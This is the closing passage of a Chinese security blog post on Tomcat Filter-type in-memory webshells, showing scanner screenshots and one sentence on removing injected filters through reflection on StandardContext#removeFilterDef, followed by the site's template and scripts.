+<p><img src="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/FilterMapScan.png" srcset="/img/loading.gif" lazyload></p>
+<p>删除的话，这里主要是通过反射调用 StandardContext#removeFilterDef 方法来进行删除</p>
+<p><img src="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/InvokerScanner.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+        <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" class="print-no-link">#内存马</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java安全-Tomcat 之 Filter 型内存马内存马基础</div>
+      <div>http://huang-d1.github.io/2025/10/16/Java安全-Tomcat 之 Filter 型内存马/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>huangdi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月16日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/14/Java%E5%AE%89%E5%85%A8-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/" title="Java安全-内存马介绍">
+                        <span class="hidden-mobile">Java安全-内存马介绍</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://Hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://huang-d1.github.io" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
